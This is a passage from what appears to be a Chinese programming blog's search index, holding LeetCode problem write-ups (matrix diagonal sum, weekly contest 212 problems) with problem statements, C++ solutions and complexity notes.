<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">game</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; guess, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; answer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(guess[i]==answer[i])&#123;</span><br><span class="line">                ++result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>算是很简单的一道题了，没啥可总结的也没有官方题解，散会😐。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>矩阵对角线元素的和</title>
    <url>/2020/11/10/%E7%9F%A9%E9%98%B5%E5%AF%B9%E8%A7%92%E7%BA%BF%E5%85%83%E7%B4%A0%E7%9A%84%E5%92%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/matrix-diagonal-sum/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个正方形矩阵 <code>mat</code>，请你返回矩阵对角线元素的和。</p>
<p>请你返回在矩阵主对角线上的元素和副对角线上且不在主对角线上元素的和。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<p><img src="/2020/11/10/%E7%9F%A9%E9%98%B5%E5%AF%B9%E8%A7%92%E7%BA%BF%E5%85%83%E7%B4%A0%E7%9A%84%E5%92%8C/sample_1911.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：mat &#x3D; [[1,2,3],</span><br><span class="line">            [4,5,6],</span><br><span class="line">            [7,8,9]]</span><br><span class="line">输出：25</span><br><span class="line">解释：对角线的和为：1 + 5 + 9 + 3 + 7 &#x3D; 25</span><br><span class="line">请注意，元素 mat[1][1] &#x3D; 5 只会被计算一次。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：mat &#x3D; [[1,1,1,1],</span><br><span class="line">            [1,1,1,1],</span><br><span class="line">            [1,1,1,1],</span><br><span class="line">            [1,1,1,1]]</span><br><span class="line">输出：8</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：mat &#x3D; [[5]]</span><br><span class="line">输出：5</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>n == mat.length == mat[i].length</code></li>
<li><code>1 &lt;= n &lt;= 100</code></li>
<li><code>1 &lt;= mat[i][j] &lt;= 100</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>根据题目描述模拟，直接加上对角线上的元素值，注意矩阵的行数为奇数时会重复加上主副对角线的重叠值，需要减去。</p>
<p><strong>c++代码：</strong>(执行用时28ms，击败98.91%，内存消耗11.5M，击败5.03%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">diagonalSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; mat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n=mat.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            result+=mat[i][i];</span><br><span class="line">            result+=mat[i][n-i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//n是奇数，减去重复加上的中间的值</span></span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">            result-=mat[(n<span class="number">-1</span>)/<span class="number">2</span>][(n<span class="number">-1</span>)/<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/matrix-diagonal-sum/solution/ju-zhen-dui-jiao-xian-yuan-su-de-he-by-leetcode-so/">官方题解</a>:</h6><p><strong>方法一：遍历矩阵</strong><br><strong>思路与算法</strong></p>
<p>遍历整个矩阵，如果当前坐标 (i, j)(i,j) 满足 i = ji=j 或者 i + j = n - 1i+j=n−1，就把当前的数字加入到答案中。</p>
<p><strong>c++代码：</strong>（执行32ms，击败93.54%，内存11.5M，击败5.16%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">diagonalSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; mat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = mat.size(), sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i == j || i + j == n - <span class="number">1</span>) &#123;</span><br><span class="line">                    sum += mat[i][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n^2)$，其中 $n$是矩阵 $\textit{mat}$的边长。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<p><strong>方法二：逐行取数</strong><br><strong>思路与算法</strong></p>
<p>逐行遍历，记当前的行号为 $i$，对于一行我们把 $(i, i)$ 位置和  加入答案。这样如果 $n$ 是奇数的话，最中间的格子会被加入两次。所以 $n$ 为奇数的时候，我们需要减掉矩阵最中心的那个值。</p>
<p><strong>c++代码：</strong>（执行36ms，击败74.17%，内存11.5M，击败5.03%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">diagonalSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; mat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = mat.size(), sum = <span class="number">0</span>, mid = n / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            sum += mat[i][i] + mat[i][n - <span class="number">1</span> - i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum - mat[mid][mid] * (n &amp; <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：，其中 $n$是矩阵 $\textit{mat}$ 的边长。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>简单，没啥可说的，go on！🙄</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>第212场周赛</title>
    <url>/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/contest/weekly-contest-212/">比赛地址</a></p>
<h6 id="比赛说明"><a href="#比赛说明" class="headerlink" title="比赛说明"></a>比赛说明</h6><p>本场竞赛由「猿辅导」&amp;「力扣」联合主办</p>
<p><strong>【工作机会奖励】</strong></p>
<ul>
<li>排名第 1 ~ 1000 名参赛者可获「猿辅导」社招简历内推机会。</li>
</ul>
<p><strong>【实物周边奖励】</strong></p>
<ul>
<li>排名第 1 ~ 10 名的参赛者可获「2020 猿辅导鼠年纪念币」；</li>
<li>排名第 11 ~ 30 名的参赛者可获「小猿手办」；</li>
<li>排名第 99、199、299 名的参赛者可获「幸运奖」；</li>
</ul>
<a id="more"></a>

<p><strong>重要提示</strong></p>
<ol>
<li><p>请注意，每个错误提交的惩罚时间已经从 <strong>10分钟</strong> 改变为了 <strong>5分钟</strong> 。</p>
</li>
<li><p>力扣一向非常重视竞赛的公平，为了保障每一位用户的权益，如有用户被检查出竞赛中存在违规行为（如抄袭、作弊等），我们会坚持以 <strong>零容忍</strong> 的态度维护竞赛的公平、公正。</p>
</li>
<li><p>以下被判定为竞赛中的违规行为</p>
<ul>
<li><p>一人使用多账号提交（英文站 LCUS 的账号 和 中文站 LCCN 的账号属于两个账号）</p>
</li>
<li><p>通过不正当的方式将部分或全部测试用例的答案直接贴到代码里的</p>
</li>
<li><p>多账号提交雷同代码（抄袭）</p>
</li>
<li><p>使用不正当手段影响他人竞赛的</p>
</li>
<li><p>竞赛结束前在讨论区发布答案的</p>
</li>
</ul>
</li>
<li><p>如被发现违规行为，我们将会严格按照以下处罚规则执行：</p>
<ul>
<li><p><strong>第一次违规</strong>：账号内的所有积分清零，账号冻结 1 个月</p>
</li>
<li><p><strong>第二次违规</strong>：永久封号</p>
</li>
</ul>
</li>
<li><p>同时我们也鼓励大家共同维护竞赛的公平和公正，我们会给与举报成功的用户额外的奖励：</p>
<ul>
<li><p>被认定为违规账号的前 10 名举报者，每人可获得 20 积分奖励</p>
</li>
<li><p>每人每场最高可获得举报成功的 100 积分奖励</p>
</li>
</ul>
</li>
</ol>
<h6 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h6><table>
<thead>
<tr>
<th>题目</th>
<th>难度</th>
<th>得分</th>
</tr>
</thead>
<tbody><tr>
<td>1.<a href="https://leetcode-cn.com/problems/slowest-key/">按键持续时间最长的键</a></td>
<td>简单</td>
<td>3</td>
</tr>
<tr>
<td>2.<a href="https://leetcode-cn.com/problems/arithmetic-subarrays/">等差子数组</a></td>
<td>中等</td>
<td>4</td>
</tr>
<tr>
<td>3.<a href="https://leetcode-cn.com/problems/path-with-minimum-effort/">最小体力消耗路径</a></td>
<td>中等</td>
<td>5</td>
</tr>
<tr>
<td>4.<a href="https://leetcode-cn.com/problems/rank-transform-of-a-matrix/">矩阵转换后的秩</a></td>
<td>困难</td>
<td>7</td>
</tr>
</tbody></table>
<h6 id="按键持续时间最长的键"><a href="#按键持续时间最长的键" class="headerlink" title="按键持续时间最长的键"></a>按键持续时间最长的键</h6><p><strong>题目描述：</strong></p>
<p>LeetCode 设计了一款新式键盘，正在测试其可用性。测试人员将会点击一系列键（总计 n 个），每次一个。</p>
<p>给你一个长度为 n 的字符串 <code>keysPressed</code> ，其中 <code>keysPressed[i]</code> 表示测试序列中第 i 个被按下的键。<code>releaseTimes</code> 是一个升序排列的列表，其中 <code>releaseTimes[i]</code> 表示松开第 i 个键的时间。字符串和数组的 <strong>下标都从 0 开始</strong> 。第 <code>0</code> 个键在时间为 <code>0</code> 时被按下，接下来每个键都 <strong>恰好</strong> 在前一个键松开时被按下。</p>
<p>测试人员想要找出按键 <strong>持续时间最长</strong> 的键。第 <code>i</code> 次按键的持续时间为 <code>releaseTimes[i] - releaseTimes[i - 1]</code> ，第 <code>0</code> 次按键的持续时间为 <code>releaseTimes[0]</code> 。</p>
<p>注意，测试期间，同一个键可以在不同时刻被多次按下，而每次的持续时间都可能不同。</p>
<p>请返回按键 <strong>持续时间最长</strong> 的键，如果有多个这样的键，则返回 <strong>按字母顺序排列最大</strong> 的那个键。</p>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：releaseTimes &#x3D; [9,29,49,50], keysPressed &#x3D; &quot;cbcd&quot;</span><br><span class="line">输出：&quot;c&quot;</span><br><span class="line">解释：按键顺序和持续时间如下：</span><br><span class="line">按下 &#39;c&#39; ，持续时间 9（时间 0 按下，时间 9 松开）</span><br><span class="line">按下 &#39;b&#39; ，持续时间 29 - 9 &#x3D; 20（松开上一个键的时间 9 按下，时间 29 松开）</span><br><span class="line">按下 &#39;c&#39; ，持续时间 49 - 29 &#x3D; 20（松开上一个键的时间 29 按下，时间 49 松开）</span><br><span class="line">按下 &#39;d&#39; ，持续时间 50 - 49 &#x3D; 1（松开上一个键的时间 49 按下，时间 50 松开）</span><br><span class="line">按键持续时间最长的键是 &#39;b&#39; 和 &#39;c&#39;（第二次按下时），持续时间都是 20</span><br><span class="line">&#39;c&#39; 按字母顺序排列比 &#39;b&#39; 大，所以答案是 &#39;c&#39;</span><br></pre></td></tr></table></figure>

<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：releaseTimes &#x3D; [12,23,36,46,62], keysPressed &#x3D; &quot;spuda&quot;</span><br><span class="line">输出：&quot;a&quot;</span><br><span class="line">解释：按键顺序和持续时间如下：</span><br><span class="line">按下 &#39;s&#39; ，持续时间 12</span><br><span class="line">按下 &#39;p&#39; ，持续时间 23 - 12 &#x3D; 11</span><br><span class="line">按下 &#39;u&#39; ，持续时间 36 - 23 &#x3D; 13</span><br><span class="line">按下 &#39;d&#39; ，持续时间 46 - 36 &#x3D; 10</span><br><span class="line">按下 &#39;a&#39; ，持续时间 62 - 46 &#x3D; 16</span><br><span class="line">按键持续时间最长的键是 &#39;a&#39; ，持续时间 16</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>releaseTimes.length == n</code></li>
<li><code>keysPressed.length == n</code></li>
<li><code>2 &lt;= n &lt;= 1000</code></li>
<li><code>0 &lt;= releaseTimes[i] &lt;= 109</code></li>
<li><code>releaseTimes[i] &lt; releaseTimes[i+1]</code></li>
<li><code>keysPressed 仅由小写英文字母组成</code></li>
</ul>
<p><strong>思路：</strong></p>
<p>用一个变量存储最长的持续时间，然后依次遍历releaseTimes计算每个键的持续时间（第1个键特殊处理），比较持续时间若相同比较字母顺序。</p>
<p><strong>提交的代码：</strong>（运行时间16ms，内存消耗10.7M）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">char</span> <span class="title">slowestKey</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; releaseTimes, <span class="built_in">string</span> keysPressed)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//先把releaseTimes转换成每个键的持续时间，从后面开始</span></span><br><span class="line">        <span class="keyword">int</span> key_time=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=releaseTimes.size()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="comment">//计算持续时间，第一个键例外</span></span><br><span class="line">            <span class="keyword">if</span>(i!=<span class="number">0</span>)&#123;</span><br><span class="line">                releaseTimes[i]=releaseTimes[i]-releaseTimes[i<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(releaseTimes[i]&gt;key_time)&#123;</span><br><span class="line">                <span class="comment">//持续时间最长的键</span></span><br><span class="line">                key_time=releaseTimes[i];</span><br><span class="line">                c=keysPressed[i];</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(releaseTimes[i]==key_time)&#123;</span><br><span class="line">                <span class="comment">//相同持续时间比较字母顺序</span></span><br><span class="line">                <span class="keyword">if</span>(keysPressed[i]&gt;c)&#123;</span><br><span class="line">                    c=keysPressed[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h6 id="等差子数组"><a href="#等差子数组" class="headerlink" title="等差子数组"></a>等差子数组</h6><p><strong>题目描述：</strong></p>
<p>如果一个数列由至少两个元素组成，且每两个连续元素之间的差值都相同，那么这个序列就是 等差数列 。更正式地，数列 <code>s</code> 是等差数列，只需要满足：对于每个有效的 <code>i</code> ， s[i+1] - s[i] == s[1] - s[0] 都成立。</p>
<p>例如，下面这些都是 <strong>等差数列</strong> ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1, 3, 5, 7, 9</span><br><span class="line">7, 7, 7, 7</span><br><span class="line">3, -1, -5, -9</span><br></pre></td></tr></table></figure>

<p>下面的数列 <strong>不是等差数列</strong> ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1, 1, 2, 5, 7</span><br></pre></td></tr></table></figure>

<p>给你一个由 <code>n</code> 个整数组成的数组 <code>nums</code>，和两个由 <code>m</code> 个整数组成的数组 <code>l</code> 和 <code>r</code>，后两个数组表示 <code>m</code> 组范围查询，其中第 <code>i</code> 个查询对应范围 <code>[l[i], r[i]]</code> 。所有数组的下标都是 <strong>从 0 开始</strong> 的。</p>
<p>返回 <code>boolean</code> 元素构成的答案列表 <code>answer</code> 。如果子数组 <code>nums[l[i]], nums[l[i]+1], ... , nums[r[i]]</code> 可以 <strong>重新排列</strong> 形成 <strong>等差数列</strong> ，<code>answer[i]</code> 的值就是 <code>true</code>；否则<code>answer[i]</code> 的值就是 <code>false</code> 。</p>
<p> <strong>示例1：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：nums = [<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">7</span>], l = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>], r = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line">输出：[<span class="literal">true</span>,<span class="literal">false</span>,<span class="literal">true</span>]</span><br><span class="line">解释：</span><br><span class="line">第 <span class="number">0</span> 个查询，对应子数组 [<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>] 。可以重新排列为等差数列 [<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>] 。</span><br><span class="line">第 <span class="number">1</span> 个查询，对应子数组 [<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">9</span>] 。无法重新排列形成等差数列。</span><br><span class="line">第 <span class="number">2</span> 个查询，对应子数组 [<span class="number">5</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">7</span>] 。可以重新排列为等差数列 [<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>] 。</span><br></pre></td></tr></table></figure>

<p><strong>示例2：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：nums = [<span class="number">-12</span>,<span class="number">-9</span>,<span class="number">-3</span>,<span class="number">-12</span>,<span class="number">-6</span>,<span class="number">15</span>,<span class="number">20</span>,<span class="number">-25</span>,<span class="number">-20</span>,<span class="number">-15</span>,<span class="number">-10</span>], l = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">7</span>], r = [<span class="number">4</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">输出：[<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">true</span>]</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>n == nums.length</code></li>
<li><code>m == l.length</code></li>
<li><code>m == r.length</code></li>
<li><code>2 &lt;= n &lt;= 500</code></li>
<li><code>1 &lt;= m &lt;= 500</code></li>
<li><code>0 &lt;= l[i] &lt; r[i] &lt; n</code></li>
<li><code>-105 &lt;= nums[i] &lt;= 105</code></li>
</ul>
<p><strong>思路：</strong></p>
<p>用vector容器存储返回结果，默认值为true。m次循环（m是数组l的长度），在每次循环中得到相对应的范围数组，然后判断数组是否是等差数列，如果不是则修改结果容器对应元素为false</p>
<p><strong>代码：</strong>（执行用时204ms，击败47.38%，内存20.9M，击败83.18%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; <span class="title">checkArithmeticSubarrays</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; l, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; r)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//定义布尔类型返回向量容器，默认值是true</span></span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; <span class="title">result</span><span class="params">(l.size(),<span class="literal">true</span>)</span></span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">        <span class="keyword">int</span> d=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//得到结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;l.size();i++)&#123;</span><br><span class="line">            <span class="comment">//数组元素清空</span></span><br><span class="line">            tmp.clear();</span><br><span class="line">            <span class="keyword">for</span>(j=l[i];j&lt;=r[i];j++)&#123;</span><br><span class="line">                <span class="comment">//存储获取到的范围数组</span></span><br><span class="line">                tmp.push_back(nums[j]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//重新排序</span></span><br><span class="line">            sort(tmp.begin(),tmp.end());</span><br><span class="line">            <span class="comment">//判断子数组是否是等差数组</span></span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;tmp.size()<span class="number">-1</span>;j++)&#123;</span><br><span class="line">                    <span class="comment">//求公差</span></span><br><span class="line">                    <span class="keyword">if</span>(j==<span class="number">0</span>)&#123;</span><br><span class="line">                        d=tmp[j+<span class="number">1</span>]-tmp[j];</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="comment">//差不等于公差d</span></span><br><span class="line">                        <span class="keyword">if</span>(tmp[j+<span class="number">1</span>]-tmp[j]!=d)&#123;</span><br><span class="line">                            result[i]=<span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp.clear();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h6 id="最小体力消耗路径"><a href="#最小体力消耗路径" class="headerlink" title="最小体力消耗路径"></a>最小体力消耗路径</h6><p><strong>题目描述：</strong></p>
<p>你准备参加一场远足活动。给你一个二维 <code>rows x columns</code> 的地图 <code>heights</code> ，其中 <code>heights[row][col]</code> 表示格子 <code>(row, col)</code> 的高度。一开始你在最左上角的格子 <code>(0, 0)</code> ，且你希望去最右下角的格子 <code>(rows-1, columns-1)</code> （注意下标从 <strong>0</strong> 开始编号）。你每次可以往 <strong>上，下，左，右</strong> 四个方向之一移动，你想要找到耗费 <strong>体力</strong> 最小的一条路径。</p>
<p>一条路径耗费的 <strong>体力值</strong> 是路径上相邻格子之间 <strong>高度差绝对值</strong> 的 <strong>最大值</strong> 决定的。</p>
<p>请你返回从左上角走到右下角的最小 <strong>体力消耗值</strong> 。</p>
<p><strong>示例1：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/ex1.png" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：heights = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">2</span>],[<span class="number">5</span>,<span class="number">3</span>,<span class="number">5</span>]]</span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：路径 [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">5</span>] 连续格子的差值绝对值最大为 <span class="number">2</span> 。</span><br><span class="line">这条路径比路径 [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">5</span>] 更优，因为另一条路劲差值最大值为 <span class="number">3</span> 。</span><br></pre></td></tr></table></figure>

<p><strong>示例2：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/ex2.png" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：heights = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">3</span>,<span class="number">5</span>]]</span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：路径 [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>] 的相邻格子差值绝对值最大为 <span class="number">1</span> ，比路径 [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">5</span>] 更优。</span><br></pre></td></tr></table></figure>

<p><strong>示例3：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/ex3.png" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：heights = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>]]</span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：上图所示路径不需要消耗任何体力。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>rows == heights.length</code></li>
<li><code>columns == heights[i].length</code></li>
<li><code>1 &lt;= rows, columns &lt;= 100</code></li>
